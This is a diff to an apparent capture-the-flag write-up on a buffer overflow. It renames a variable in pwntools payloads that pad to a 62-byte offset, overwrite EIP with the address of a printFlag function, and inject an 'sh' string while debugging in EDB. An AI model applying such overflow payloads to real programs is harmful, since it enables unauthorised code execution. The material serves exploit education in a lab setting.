@@ -18,7 +18,7 @@ Offset remains the same - 62, the address of the printFlag function is 0x5655628
 Now let's try the exploit from **Never Called**, but change the payload itself to the next one to get a better understanding of what will happen.
 
 ```python
-payload2 = flat(
+payload = flat(
     b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapa',
     p32(0x5655628b),
 )
@@ -32,7 +32,7 @@ And in EDB let's see what happens in the printFlag function. We set breakpoint a
 We see that the last to be written from our line is 'aala'. Then we write *'sh'* instead and after it and the flaw byte to overwrite the EIP register. And add another 20 characters and see what happens to the program.
 
 ```python
-payload2 = flat(
+payload = flat(
     b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaaka',
     b'sh\x00',
     b'aaamaaanaaaoaaapp',
